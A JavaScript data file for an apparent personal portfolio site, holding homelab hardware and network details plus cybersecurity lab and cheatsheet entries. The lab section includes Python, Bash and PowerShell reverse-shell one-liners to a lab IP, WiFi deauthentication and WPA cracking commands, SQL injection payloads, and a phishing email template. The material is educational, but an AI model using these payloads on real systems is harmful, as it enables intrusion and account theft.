/**
 * Data Storage for ZakPT Website
 * Contains all static content and configuration data
 * Loaded before enhanced.js
 */

// ========================================
// CONFIGURATION
// ========================================
const CONFIG = {
    // Replace with your actual YouTube Channel ID (e.g., UCxxxxxxxxxxxx)
    YOUTUBE_CHANNEL_ID: 'UC9x0AN7BWHpCDHSm9NiJFJQ',
    // Replace with your actual Blog RSS Feed URL
    BLOG_RSS_URL: 'https://technotim.live/feed.xml',
    // Set to true to attempt real fetching (requires valid IDs above)
    USE_REAL_DATA: true
};

// ========================================
// PROJECT DATA (PORTFOLIO)
// ========================================
const WORKBENCH_DATA = [
    {
        status: 'IN PROGRESS',
        statusClass: 'pulse', // pulse, green, yellow
        icon: 'fa-microchip',
        tag: 'CURRENT BUILD',
        completion: '75%',
        title: 'Custom Watercooled Loop',
        description: 'Hardline tubing, dual radiators, and enough RGB to blind a pilot. Currently leak testing the GPU block.',
        techStack: ['EKWB', 'Corsair', 'Ryzen 9'],
        link: '#',
        linkText: 'VIEW LOGS >',
        featured: true
    },
    {
        status: 'COMPLETED',
        statusClass: 'green',
        icon: 'fa-keyboard',
        tag: 'KEYBOARD',
        title: 'Split Ergo Build',
        description: 'Hand-wired, QMK firmware, custom 3D printed case.',
        techStack: ['QMK', 'C++', '3D Print'],
        featured: false
    },
    {
        status: 'PLANNED',
        statusClass: 'yellow',
        icon: 'fa-network-wired',
        tag: 'IOT',
        title: 'Home Assistant Dashboard',
        description: 'Automating the entire house with custom ESP32 sensors.',
        techStack: ['HA', 'Zigbee', 'MQTT'],
        link: 'homelab.html',
        linkText: 'VIEW SETUP >',
        featured: false
    }
];

// ========================================
// SERVER DATA
// ========================================
const SERVER_DATA = {
    'proxmox-01': {
        name: 'PROXMOX-01',
        type: 'Virtualization Host',
        specs: {
            cpu: 'Dual Intel Xeon E5-2680 v4 (28 cores, 56 threads)',
            ram: '256GB DDR4 ECC @ 2400MHz',
            storage: '2x 1TB NVMe (RAID 1) + 8x 4TB SAS (RAID 10)',
            network: '4x 10GbE SFP+',
            psu: 'Dual 1100W 80+ Platinum'
        },
        services: ['Plex', 'Home Assistant', 'Grafana', 'Pi-hole', 'Docker', 'Portainer'],
        uptime: '99.99%',
        powerDraw: '280W avg'
    },
    'truenas-core': {
        name: 'TRUENAS-CORE',
        type: 'Network Attached Storage',
        specs: {
            cpu: 'Intel Xeon E5-2680 v3 (12 cores, 24 threads)',
            ram: '128GB DDR4 ECC @ 2133MHz',
            storage: '8x 12TB WD Red Pro (RAIDZ2) + 2x 1TB NVMe Cache',
            network: '2x 10GbE SFP+',
            psu: 'Single 850W 80+ Gold'
        },
        services: ['SMB', 'NFS', 'iSCSI', 'Snapshots', 'Replication'],
        uptime: '99.98%',
        powerDraw: '180W avg'
    },
    'unifi-udm-pro': {
        name: 'UniFi Dream Machine Pro',
        type: 'Network Gateway & Controller',
        specs: {
            cpu: 'Quad-core ARM Cortex-A57 @ 1.7GHz',
            ram: '4GB DDR4',
            storage: '128GB eMMC + 1x 3.5" HDD Bay',
            network: '8x 1GbE + 2x 10G SFP+',
            psu: '35W',
            model: 'UDM-PRO'
        },
        services: ['Router', 'Firewall', 'IDS/IPS', 'UniFi Controller', 'VPN'],
        uptime: '100%',
        powerDraw: '35W avg'
    },
    'udm-enterprise-poe': {
        name: 'Enterprise Campus 24 PoE',
        type: 'Layer 3 Etherlighting™ PoE+++ Switch',
        specs: {
            cpu: 'N/A (Layer 3 Switch)',
            ram: 'N/A',
            storage: 'N/A',
            network: '8x 2.5GbE RJ45 (PoE+++) + 16x 10GbE RJ45 (PoE+++) + 2x 25G SFP28',
            psu: 'Dual Hot-Swappable PSUs (up to 2x 1200W)',
            model: 'ECS-24-PoE'
        },
        services: ['Layer 3 Routing', 'VLAN', 'Link Aggregation', 'STP/RSTP', 'Etherlighting™'],
        uptime: '100%',
        powerDraw: '1050W PoE Budget (Shared Mode)'
    },
    'nuc-cluster-01': {
        name: 'NUC-CLUSTER-01',
        type: 'Intel NUC Compute Node',
        specs: {
            cpu: 'Intel Core i7-1165G7 (4 cores, 8 threads)',
            ram: '64GB DDR4 @ 3200MHz',
            storage: '1TB NVMe SSD',
            network: '1x 2.5GbE',
            psu: '65W'
        },
        services: ['Kubernetes', 'Rancher', 'GitLab Runner', 'Monitoring'],
        uptime: '99.95%',
        powerDraw: '45W avg'
    }
};

// ========================================
// NETWORK DATA
// ========================================
const TOPOLOGY_DATA = {
    title: 'Network Topology',
    description: 'Complete network infrastructure layout',
    vlans: [
        { id: 10, name: 'Management', subnet: '192.168.10.0/24', devices: 8 },
        { id: 20, name: 'Servers', subnet: '192.168.20.0/24', devices: 12 },
        { id: 30, name: 'IoT', subnet: '192.168.30.0/24', devices: 45 },
        { id: 40, name: 'Guest', subnet: '192.168.40.0/24', devices: 5 }
    ],
    routing: 'Static routes + BGP peering with ISP',
    firewall: 'Zone-based firewall with IDS/IPS (Suricata)',
    dns: 'Pi-hole (primary) + Cloudflare (secondary)',
    bandwidth: '1Gbps down / 50Mbps up',
    devices: {
        total: 70,
        wired: 25,
        wireless: 45
    }
};

const NETWORK_NODES = {
    'udm-pro': {
        name: 'UniFi Dream Machine Pro',
        type: 'Router & Security Gateway',
        ip: '10.0.0.1',
        specs: {
            model: 'UDM-PRO',
            cpu: 'Quad-core ARM Cortex-A57 @ 1.7GHz',
            ram: '4GB DDR4',
            ports: '8x 1GbE + 2x 10G SFP+',
            throughput: '3.5 Gbps (IDS/IPS enabled)'
        },
        features: ['Routing', 'Firewall', 'IDS/IPS', 'VPN Server', 'UniFi Controller'],
        uptime: '100%'
    },
    'usw-pro': {
        name: 'USW-Pro-24-POE',
        type: 'Managed PoE Switch',
        specs: {
            model: 'USW-Pro-24-POE',
            ports: '24x 1GbE PoE+ + 2x 10G SFP+',
            poe_budget: '400W',
            switching_capacity: '70 Gbps',
            layer: 'Layer 2+'
        },
        features: ['802.3af/at PoE+', 'VLAN', 'Link Aggregation', 'STP/RSTP'],
        connected_devices: 18
    },
    'u6-pro': {
        name: 'UniFi 6 Pro',
        type: 'WiFi 6 Access Point',
        specs: {
            model: 'U6-PRO',
            wifi_standard: 'WiFi 6 (802.11ax)',
            max_speed: '4.8 Gbps',
            radios: '2.4GHz + 5GHz',
            clients: 'Up to 300'
        },
        features: ['WiFi 6', 'MU-MIMO', 'OFDMA', 'WPA3', 'PoE Powered'],
        connected_clients: 23
    },
    'servers': {
        name: 'Server VLAN',
        type: 'Infrastructure Network Segment',
        vlan: 10,
        subnet: '192.168.20.0/24',
        gateway: '192.168.20.1',
        devices: ['PROXMOX-01', 'TRUENAS-CORE', 'NUC-CLUSTER-01'],
        services: ['VMs', 'Containers', 'Storage', 'K8s Cluster'],
        security: 'Isolated from guest/IoT networks'
    },
    'iot': {
        name: 'IoT VLAN',
        type: 'Smart Home Network Segment',
        vlan: 20,
        subnet: '192.168.30.0/24',
        gateway: '192.168.30.1',
        devices: ['Smart Lights', 'Sensors', 'Cameras', 'Smart Plugs'],
        device_count: 45,
        security: 'Restricted internet access, isolated from main network'
    },
    'udm-enterprise-poe': {
        name: 'Enterprise Campus 24 PoE',
        type: 'Layer 3 Etherlighting™ PoE+++ Switch',
        specs: {
            model: 'ECS-24-PoE',
            ports: '8x 2.5GbE RJ45 (PoE+++) + 16x 10GbE RJ45 (PoE+++) + 2x 25G SFP28',
            poe_budget: 'Up to 1,050W (Shared Mode)',
            switching_capacity: '460 Gbps',
            layer: 'Layer 3',
            max_poe_per_port: 'PoE+++'
        },
        features: ['Layer 3 Switching', 'Etherlighting™', 'PoE+++', 'VLAN', 'Link Aggregation', 'STP/RSTP', 'Hot-Swappable PSUs', 'Hot-Swappable Fans'],
        uptime: '100%'
    }
};

// ========================================
// SERVICE DATA
// ========================================
const SERVICE_DATA = {
    'plex': {
        name: 'Plex Media Server',
        description: 'Media streaming and management platform',
        container: 'plex-media-server',
        host: 'proxmox-01',
        ports: [32400, 1900, 5353],
        resources: { cpu: '15%', ram: '4.2GB', storage: '2.5TB' },
        uptime: '45 days',
        url: 'https://plex.local:32400',
        status: 'online'
    },
    'pihole': {
        name: 'Pi-hole DNS',
        description: 'Network-wide ad blocking and DNS server',
        container: 'pihole',
        host: 'proxmox-01',
        ports: [53, 80, 443],
        resources: { cpu: '2%', ram: '180MB', storage: '1.2GB' },
        uptime: '47 days',
        url: 'https://pihole.local/admin',
        stats: { queries: '2.4M', blocked: '18%' },
        status: 'online'
    },
    'homeassistant': {
        name: 'Home Assistant',
        description: 'Home automation hub',
        container: 'homeassistant',
        host: 'proxmox-01',
        ports: [8123],
        resources: { cpu: '8%', ram: '512MB', storage: '8.5GB' },
        uptime: '47 days',
        url: 'https://homeassistant.local:8123',
        stats: { devices: 45, automations: 23 },
        status: 'online'
    },
    'grafana': {
        name: 'Grafana',
        description: 'Metrics visualization and dashboards',
        container: 'grafana',
        host: 'proxmox-01',
        ports: [3000],
        resources: { cpu: '5%', ram: '256MB', storage: '1.1GB' },
        uptime: '47 days',
        url: 'https://grafana.local:3000',
        stats: { dashboards: 12, datasources: 3 },
        status: 'online'
    },
    'portainer': {
        name: 'Portainer',
        description: 'Docker container management',
        container: 'portainer',
        host: 'proxmox-01',
        ports: [9000, 9443],
        resources: { cpu: '1%', ram: '64MB', storage: '512MB' },
        uptime: '47 days',
        url: 'https://portainer.local:9443',
        stats: { containers: 28, stacks: 7 },
        status: 'online'
    },
    'nginx': {
        name: 'Nginx Proxy Manager',
        description: 'Reverse proxy with SSL management',
        container: 'nginx-proxy-manager',
        host: 'proxmox-01',
        ports: [80, 443, 81],
        resources: { cpu: '3%', ram: '128MB', storage: '2.8GB' },
        uptime: '47 days',
        url: 'https://npm.local:81',
        stats: { hosts: 15, certs: 15 },
        status: 'online'
    }
};

// ========================================
// CYBER SECURITY DATA (PORTFOLIO)
// ========================================
const UPCOMING_PROJECTS_DATA = [
    {
        title: 'Network Traffic Analysis Lab',
        category: 'Blue Team',
        difficulty: 'Intermediate',
        icon: 'fa-network-wired',
        description: 'A comprehensive environment for analyzing network traffic patterns, detecting anomalies, and practicing packet capture analysis using Wireshark and Zeek.',
        techStack: ['Wireshark', 'Zeek', 'Python', 'Docker'],
        status: 'completed',
        featured: true,
        details: {
            overview: 'This lab simulates a realistic corporate network with various traffic types. The goal is to identify malicious activity, such as C2 communication, data exfiltration, and lateral movement.',
            features: [
                'Automated traffic generation using Python scripts',
                'Integrated ELK stack for log analysis',
                'Specific scenarios for malware analysis'
            ],
            githubParams: {
                user: 'zakpt',
                repo: 'network-analysis-lab'
            }
        }
    },
    {
        title: 'Automated Vulnerability Scanner',
        category: 'Red Team',
        difficulty: 'Advanced',
        icon: 'fa-bug',
        description: 'A custom Python-based vulnerability scanner that identifies common web application security flaws and generates detailed reports.',
        techStack: ['Python', 'Requests', 'BeautifulSoup', 'Reporting'],
        status: 'in-progress',
        featured: true,
        details: {
            overview: 'Built to automate the reconnaissance phase of penetration testing. It checks for misconfigurations, outdated software, and common vulnerabilities like XSS and SQLi.',
            features: [
                'Multithreaded scanning for speed',
                'Customizable payload lists',
                'HTML and PDF report generation'
            ],
            githubParams: {
                user: 'zakpt',
                repo: 'vuln-scanner'
            }
        }
    },
    {
        title: 'Secure File Storage System',
        category: 'DevSecOps',
        difficulty: 'Intermediate',
        icon: 'fa-shield-alt',
        description: 'An encrypted file storage application demonstrating secure coding practices, key management, and access control implementation.',
        techStack: ['Node.js', 'React', 'AES-256', 'PostgreSQL'],
        status: 'completed',
        featured: false,
        details: {
            overview: 'This project focuses on data protection at rest and in transit. It implements end-to-end encryption and robust role-based access control (RBAC).',
            features: [
                'Client-side encryption using Web Crypto API',
                'Secure key management integration',
                'Comprehensive audit logging'
            ],
            githubParams: {
                user: 'zakpt',
                repo: 'secure-storage'
            }
        }
    },
    {
        title: 'Active Directory Lab',
        category: 'Infrastructure',
        difficulty: 'Advanced',
        icon: 'fa-users-cog',
        description: 'A virtualized Active Directory environment for practicing domain administration, hardening, and attack simulation.',
        techStack: ['Windows Server', 'PowerShell', 'GPO', 'VirtualBox'],
        status: 'maintained',
        featured: false,
        details: {
            overview: 'A sandbox for understanding AD architecture. Includes scenarios for Kerberoasting, AS-REP Roasting, and Golden Ticket attacks.',
            features: [
                'Automated domain deployment script',
                'Vulnerable configuration presets',
                'Blue team monitoring setup'
            ]
        }
    }
];

const GENERAL_DOCS_DATA = [
    {
        title: 'Linux Hardening Guide',
        category: 'System Security',
        description: 'Essential steps to secure a Linux server for production use.',
        icon: 'fa-linux',
        content: `
# Linux Hardening Guide

## 1. User Management
- Disable root login via SSH (\`PermitRootLogin no\`)
- Use key-based authentication only
- Enforce strong password policies

## 2. Network Security
- Configure UFW/iptables to deny all incoming by default
- Install Fail2Ban to protect SSH
- Change default SSH port

## 3. Updates & Maintenance
- Enable automatic security updates
- Regularly audit installed packages
        `,
        tools: ['SSH', 'UFW', 'Fail2Ban']
    },
    {
        title: 'Web App Pentest Framework',
        category: 'Penetration Testing',
        description: 'A structured methodology for assessing web application security.',
        icon: 'fa-globe',
        content: `
# Web App Pentest Framework

## Phase 1: Reconnaissance
- Domain enumeration
- Technology stack identification
- Content discovery

## Phase 2: Vulnerability Assessment
- Injection flaws (SQLi, XSS)
- Authentication bypass
- Authorization issues (IDOR)

## Phase 3: Exploitation & Reporting
- Proof of Concept (PoC) development
- Impact analysis
- Remediation recommendations
        `,
        tools: ['Burp Suite', 'OWASP ZAP', 'Nmap']
    },
    {
        title: 'Incident Response Plan',
        category: 'Blue Team',
        description: 'Standard operating procedures for handling security incidents.',
        icon: 'fa-file-medical-alt',
        content: `
# Incident Response Plan

## 1. Preparation
- Define roles and responsibilities
- Set up communication channels
- specific tools and access rights

## 2. Detection & Analysis
- Monitor alerts and logs
- Triage incidents based on severity
- Verify false positives

## 3. Containment, Eradication, & Recovery
- Isolate affected systems
- Remove malicious artifacts
- Restore from clean backups
        `,
        tools: ['SIEM', 'EDR', 'Digital Forensics']
    },
    {
        title: 'Docker Security Best Practices',
        category: 'Container Security',
        description: 'Guidelines for securing containerized applications.',
        icon: 'fab fa-docker',
        content: `
# Docker Security Best Practices

## 1. Image Security
- Use minimal base images (Alpine)
- Scan images for vulnerabilities
- Verify image signatures

## 2. Runtime Security
- Do not run containers as root
- Limit container resources (CPU/RAM)
- Read-only file systems where possible

## 3. Network & Secrets
- Isolate container networks
- Never hardcode secrets in Dockerfiles
- Use Docker Secrets or Vault
        `,
        tools: ['Docker Bench', 'Trivy', 'Hadolint']
    }
];

// ========================================
// CYBER SECURITY DATA (LABS & MODULES)
// ========================================

const CYBER_LABS_DATA = {
    'rubber-ducky': {
        name: 'Rubber Ducky Scripts',
        category: 'HID Attacks',
        description: 'Collection of DuckyScript payloads for USB Rubber Ducky, designed for authorized penetration testing and security automation tasks.',
        objectives: [
            'Understanding HID (Human Interface Device) attack vectors',
            'Payload development and testing',
            'Keystroke injection techniques',
            'Post-exploitation automation'
        ],
        tools: ['USB Rubber Ducky', 'DuckyScript', 'PayloadStudio'],
        code: `REM Example: Windows Admin Recon
DELAY 2000
GUI r
DELAY 500
STRING cmd
ENTER
DELAY 750
STRING whoami && hostname && ipconfig
ENTER
DELAY 1000
STRING exit
ENTER`,
        resources: [
            { name: 'Hak5 Docs', url: 'https://docs.hak5.org/hc/en-us/categories/360002117973' },
            { name: 'GitHub Payloads', url: 'https://github.com/hak5/usbrubberducky-payloads' }
        ]
    },
    'wifi-audit': {
        name: 'WiFi Audit Lab',
        category: 'Wireless Security',
        description: 'Controlled environment for testing WPA/WPA2/WPA3 security using industry-standard tools. Focuses on understanding wireless encryption weaknesses and defense mechanisms.',
        objectives: [
            'Wireless network reconnaissance',
            'WPA handshake capture techniques',
            'Password cracking methodology',
            'Secure wireless configuration'
        ],
        tools: ['Kali Linux', 'Aircrack-ng', 'Hashcat', 'Wireshark'],
        code: `# Start monitor mode
airmon-ng start wlan0

# Capture WPA handshake
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Deauth to force handshake
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# Crack with Aircrack
aircrack-ng -w rockyou.txt capture-01.cap`,
        resources: [
            { name: 'Aircrack-ng Docs', url: 'https://www.aircrack-ng.org/documentation.html' },
            { name: 'WiFi Security Guide', url: 'https://www.wpa3.info/' }
        ]
    },
    'home-ids': {
        name: 'Home IDS with Snort',
        category: 'Network Security',
        description: 'Intrusion Detection System deployment on Raspberry Pi to monitor home network traffic for malicious activity and policy violations.',
        objectives: [
            'Understanding IDS/IPS concepts',
            'Rule writing and tuning',
            'Traffic analysis',
            'Log management and alerting'
        ],
        tools: ['Snort', 'Raspberry Pi', 'Barnyard2', 'PulledPork'],
        code: `# Snort rule example
alert tcp $EXTERNAL_NET any -> $HOME_NET 22 (\\
    msg:"SSH Brute Force Attempt"; \\
    flow:to_server,established; \\
    detection_filter:track by_src, count 5, seconds 60; \\
    classtype:attempted-admin; \\
    sid:1000001; \\
)

# Run Snort
snort -A console -q -c /etc/snort/snort.conf -i eth0`,
        resources: [
            { name: 'Snort Manual', url: 'https://www.snort.org/documents' },
            { name: 'Rule Writing Guide', url: 'https://docs.snort.org/rules/headers' }
        ]
    },
    'ctf-writeups': {
        name: 'CTF Writeups',
        category: 'Capture The Flag',
        description: 'Detailed walkthroughs and methodologies for HackTheBox, TryHackMe, and other CTF platforms, focusing on privilege escalation and exploitation techniques.',
        objectives: [
            'Enumeration methodologies',
            'Exploitation techniques',
            'Privilege escalation paths',
            'Documentation best practices'
        ],
        tools: ['Metasploit', 'Nmap', 'LinPEAS', 'GTFOBins'],
        code: `# Linux PrivEsc Example
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Check sudo permissions
sudo -l

# Search for exploits
searchsploit <service_name>

# GTFOBins for SUID abuse
https://gtfobins.github.io/`,
        resources: [
            { name: 'HackTheBox', url: 'https://www.hackthebox.com' },
            { name: 'TryHackMe', url: 'https://tryhackme.com' }
        ]
    },
    'password-analyzer': {
        name: 'Password Strength Analyzer',
        category: 'Cryptography',
        description: 'Python tool that evaluates password strength using entropy calculation, common pattern detection, and comparison against known breach databases.',
        objectives: [
            'Understanding password entropy',
            'Pattern recognition algorithms',
            'HIBP API integration',
            'Building security tools'
        ],
        tools: ['Python', 're module', 'hashlib', 'HIBP API'],
        code: `import math
import re
import hashlib

def calculate_entropy(password):
    charset_size = 0
    if re.search(r'[a-z]', password): charset_size += 26
    if re.search(r'[A-Z]', password): charset_size += 26
    if re.search(r'[0-9]', password): charset_size += 10
    if re.search(r'[^a-zA-Z0-9]', password): charset_size += 32
    
    entropy = len(password) * math.log2(charset_size)
    return entropy

def check_common_patterns(password):
    patterns = [r'12345', r'qwerty', r'password', r'^[a-z]+$']
    return any(re.search(p, password.lower()) for p in patterns)`,
        resources: [
            { name: 'HIBP API', url: 'https://haveibeenpwned.com/API/v3' },
            { name: 'NIST Guidelines', url: 'https://pages.nist.gov/800-63-3/' }
        ]
    },
    'web-scanner': {
        name: 'Web Application Scanner',
        category: 'Web Security',
        description: 'Custom Python-based scanner to detect OWASP Top 10 vulnerabilities including SQL injection, XSS, and security misconfigurations.',
        objectives: [
            'Understanding web vulnerabilities',
            'Automated scanning techniques',
            'False positive reduction',
            'Secure coding practices'
        ],
        tools: ['Python', 'Requests', 'BeautifulSoup', 'SQLmap'],
        code: `import requests
from bs4 import BeautifulSoup

def test_sql_injection(url, param):
    payloads = ["'", "1' OR '1'='1", "1; DROP TABLE users--"]
    for payload in payloads:
        test_url = f"{url}?{param}={payload}"
        response = requests.get(test_url)
        
        # Check for SQL errors
        sql_errors = ['SQL syntax', 'mysql_fetch', 'ORA-']
        if any(error in response.text for error in sql_errors):
            return {'vulnerable': True, 'payload': payload}
    
    return {'vulnerable': False}`,
        resources: [
            { name: 'OWASP Top 10', url: 'https://owasp.org/www-project-top-ten/' },
            { name: 'PortSwigger Academy', url: 'https://portswigger.net/web-security' }
        ]
    },
    'sql-injection-lab': {
        name: 'SQL Injection Lab',
        category: 'Web Security',
        description: 'Intentionally vulnerable web application environment for practicing SQL injection techniques and learning proper remediation methods.',
        objectives: [
            'SQL injection exploitation',
            'Blind SQLi techniques',
            'Prepared statements',
            'Input validation'
        ],
        tools: ['PHP', 'MySQL', 'SQLmap', 'Burp Suite'],
        code: `# Classic SQL Injection Example
# Vulnerable Query
$query = "SELECT * FROM users WHERE username='$user' AND password='$pass'";

# Exploit
username: admin' OR '1'='1' --
password: anything

# Secure Fix with Prepared Statements
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password_hash]);`,
        resources: [
            { name: 'SQLmap Usage', url: 'https://github.com/sqlmapproject/sqlmap/wiki/Usage' },
            { name: 'DVWA', url: 'https://github.com/digininja/DVWA' }
        ]
    },
    'packet-sniffer': {
        name: 'Packet Sniffer',
        category: 'Network Analysis',
        description: 'Lightweight network packet capture tool built with Python Scapy for real-time traffic analysis and protocol dissection.',
        objectives: [
            'Network protocol analysis',
            'Packet crafting',
            'Traffic filtering',
            'Network troubleshooting'
        ],
        tools: ['Python', 'Scapy', 'Wireshark'],
        code: `from scapy.all import sniff, IP, TCP

def packet_callback(packet):
    if packet.haslayer(IP):
        src_ip = packet[IP].src
        dst_ip = packet[IP].dst
        
        if packet.haslayer(TCP):
            src_port = packet[TCP].sport
            dst_port = packet[TCP].dport
            print(f"{src_ip}:{src_port} -> {dst_ip}:{dst_port}")

# Capture packets
sniff(filter="tcp port 80", prn=packet_callback, count=100)`,
        resources: [
            { name: 'Scapy Docs', url: 'https://scapy.readthedocs.io/' },
            { name: 'Packet Analysis', url: 'https://packetlife.net/library/cheat-sheets/' }
        ]
    },
    'honeypot': {
        name: 'Honeypot Deployment',
        category: 'Threat Intelligence',
        description: 'T-Pot multi-honeypot platform deployment to analyze attack patterns, gather threat intelligence, and study attacker methodologies.',
        objectives: [
            'Honeypot concepts',
            'Attack pattern analysis',
            'Threat intelligence gathering',
            'Log aggregation'
        ],
        tools: ['T-Pot', 'Docker', 'ELK Stack', 'Cowrie'],
        code: `# T-Pot Installation
git clone https://github.com/telekom-security/tpotce
cd tpotce
./install.sh

# View attacks in real-time
docker logs -f cowrie

# Access Kibana dashboard
https://your-honeypot-ip:64297`,
        resources: [
            { name: 'T-Pot GitHub', url: 'https://github.com/telekom-security/tpotce' },
            { name: 'Honeypot Guide', url: 'https://www.sans.org/white-papers/33009/' }
        ]
    },
    'ssh-hardening': {
        name: 'SSH Hardening Guide',
        category: 'System Hardening',
        description: 'Comprehensive guide and automation scripts for securing SSH servers against brute-force attacks and unauthorized access.',
        objectives: [
            'SSH configuration best practices',
            'Key-based authentication',
            'Fail2ban implementation',
            'Access control'
        ],
        tools: ['OpenSSH', 'Fail2ban', 'UFW'],
        code: `# /etc/ssh/sshd_config hardening
PermitRootLogin no
PasswordAuthentication no
PubkeyAuthentication yes
Port 2222
Protocol 2
MaxAuthTries 3
ClientAliveInterval 300
ClientAliveCountMax 2

# Fail2ban jail for SSH
[sshd]
enabled = true
port = 2222
filter = sshd
logpath = /var/log/auth.log
maxretry = 3
bantime = 3600`,
        resources: [
            { name: 'SSH Hardening Guide', url: 'https://www.ssh.com/academy/ssh/security' },
            { name: 'Fail2ban Manual', url: 'https://www.fail2ban.org/wiki/index.php/Main_Page' }
        ]
    },
    'reverse-shell-gen': {
        name: 'Reverse Shell Generator',
        category: 'Post-Exploitation',
        description: 'Multi-platform tool to generate reverse shell payloads for various languages and operating systems during penetration testing.',
        objectives: [
            'Reverse shell concepts',
            'Payload generation',
            'Command injection',
            'Netcat listeners'
        ],
        tools: ['Netcat', 'Python', 'Bash', 'PowerShell'],
        code: `# Python Reverse Shell
python -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.10.1",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'

# Bash Reverse Shell
bash -i >& /dev/tcp/10.10.10.1/4444 0>&1

# PowerShell Reverse Shell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.10.1",4444)

# Netcat Listener
nc -lvnp 4444`,
        resources: [
            { name: 'Reverse Shell Cheatsheet', url: 'https://github.com/swisskyrepo/PayloadsAllTheThings' },
            { name: 'PentestMonkey', url: 'https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet' }
        ]
    },
    'phishing-sim': {
        name: 'Phishing Awareness Simulator',
        category: 'Security Awareness',
        description: 'GoPhish-based platform for conducting simulated phishing campaigns to train users to recognize social engineering attacks.',
        objectives: [
            'Social engineering tactics',
            'Campaign management',
            'User awareness training',
            'Metrics and reporting'
        ],
        tools: ['GoPhish', 'MailHog', 'HTML/CSS'],
        code: `# GoPhish Installation
wget https://github.com/gophish/gophish/releases/download/v0.11.0/gophish-v0.11.0-linux-64bit.zip
unzip gophish-v0.11.0-linux-64bit.zip
chmod +x gophish
./gophish

# Access dashboard
https://localhost:3333

# Example email template
Subject: Urgent: Password Reset Required
Body: Click here to reset your password: {{.URL}}`,
        resources: [
            { name: 'GoPhish Docs', url: 'https://docs.getgophish.com/' },
            { name: 'Phishing Framework', url: 'https://www.social-engineer.org/framework/attack-vectors/phishing-attacks/' }
        ]
    }
};

const CYBER_CHEATSHEETS_DATA = {
    'linux-privesc': {
        name: 'Linux Privilege Escalation',
        category: 'Cheatsheet',
        description: 'Common commands and techniques for escalating privileges on Linux systems.',
        content: `# Linux Privilege Escalation

## 📊 Escalation Workflow
\`\`\`text
+----------------+      +----------------+      +----------------+
|  Initial Access | ---> |   Enumeration  | ---> | Exploitation   |
|  (User Shell)   |      | (Find Vectors) |      | (Root Shell)   |
+----------------+      +----------------+      +----------------+
        |                       |                       |
        v                       v                       v
   SSH / RCE / RevShell    SUID / Kernel / Cron    # whoami -> root
\`\`\`

## 🔍 System Enumeration
Before running exploits, gather information about the target system.

### OS & Kernel Info
\`\`\`bash
uname -a                    # Kernel version
cat /etc/issue              # Distribution info
cat /etc/*-release          # Release info
lscpu                       # CPU architecture
\`\`\`

### User & Group Info
\`\`\`bash
id                          # Current user context
whoami                      # Current username
groups                      # Group memberships
cat /etc/passwd             # List all users
cat /etc/group              # List all groups
sudo -l                     # Check sudo privileges (Critical!)
\`\`\`

## 🛠️ Common Vectors

### 1. SUID/SGID Binaries
Executables with the SUID bit run with the permissions of the file owner (often root).
\`\`\`bash
# Find SUID files
find / -perm -u=s -type f 2>/dev/null

# Find SGID files
find / -perm -g=s -type f 2>/dev/null
\`\`\`
*Tip: Check GTFOBins for SUID exploit techniques.*

### 2. Cron Jobs
Inspect scheduled tasks for writable scripts or paths.
\`\`\`bash
cat /etc/crontab
ls -la /etc/cron.d/
ps -ef | grep cron
\`\`\`

### 3. Kernel Exploits
If the kernel is outdated, a compiled exploit might grant root.
\`\`\`bash
# Check for DirtyCow, PwnKit, etc.
uname -r
searchsploit linux kernel <version>
\`\`\`

## 📜 Automated Tools
- **LinPEAS**: Comprehensive enumeration script.
- **LinEnum**: Classic enumeration script.
- **GTFOBins**: Reference for binary exploitation.`,
        tools: ['LinPEAS', 'GTFOBins', 'Metasploit']
    },
    'nmap-ref': {
        name: 'Nmap Reference',
        category: 'Cheatsheet',
        description: 'Essential Nmap commands for network discovery and security auditing.',
        content: `# Nmap Cheatsheet

## 📡 Scan Types Visualized

### TCP Connect Scan (-sT)
Complete 3-way handshake. Reliable but noisy.
\`\`\`text
Attacker          Target
   |   SYN           |
   |---------------->|
   |   SYN/ACK       |
   |<----------------|
   |   ACK           |
   |---------------->|
   |   Connection    |
\`\`\`

### SYN Scan (-sS)
"Stealth" scan. Resets connection before completion.
\`\`\`text
Attacker          Target
   |   SYN           |
   |---------------->|
   |   SYN/ACK       |
   |<----------------|
   |   RST           |
   |---------------->|
   |   No Connection |
\`\`\`

## 🚀 Basic Scans
\`\`\`bash
nmap 10.10.10.1                          # Basic scan (Top 1000 ports)
nmap -p- 10.10.10.1                      # All 65535 ports (Thorough)
nmap -p 22,80,443 10.10.10.1             # Specific ports
\`\`\`

## 🕵️ Service & OS Detection
Gather more intelligence about the target.
\`\`\`bash
nmap -sV 10.10.10.1                      # Version detection
nmap -O 10.10.10.1                       # OS detection
nmap -A 10.10.10.1                       # Aggressive (OS + Version + Scripts + Traceroute)
\`\`\`

## ⚡ Performance Timing
Adjust scan speed to avoid detection or speed up.
\`\`\`bash
nmap -T0 10.10.10.1                      # Paranoid (Very slow)
nmap -T4 10.10.10.1                      # Aggressive (Fast, recommended for CTFs)
nmap -T5 10.10.10.1                      # Insane (May miss ports)
\`\`\`

## 📝 Output Formats
Save your results for reporting.
\`\`\`bash
nmap -oN scan.txt 10.10.10.1             # Normal text output
nmap -oG scan.gnmap 10.10.10.1           # Greppable format
nmap -oA scan 10.10.10.1                 # All formats (Normal, XML, Greppable)
\`\`\`

## 🧩 NSE Scripts
Use the Nmap Scripting Engine for vulnerability scanning.
\`\`\`bash
nmap --script default 10.10.10.1         # Default safe scripts
nmap --script vuln 10.10.10.1            # Check for known vulnerabilities
nmap --script http-enum 10.10.10.1       # Enumerate HTTP directories
\`\`\``,
        tools: ['Nmap', 'Masscan', 'RustScan']
    },
    'reverse-shells': {
        name: 'Reverse Shells',
        category: 'Cheatsheet',
        description: 'One-liners for establishing reverse shells in multiple languages.',
        content: `# Reverse Shell Cheatsheet

## 🔄 Concept: Reverse vs Bind
\`\`\`text
[ Reverse Shell ]           [ Bind Shell ]
Attacker      Target        Attacker      Target
   |   <-------- |             | -------->   |
(Listens)    (Connects)    (Connects)    (Listens)
\`\`\`
*Use Reverse Shells when the target is behind a firewall (NAT).*

## 🎧 The Listener (Netcat)
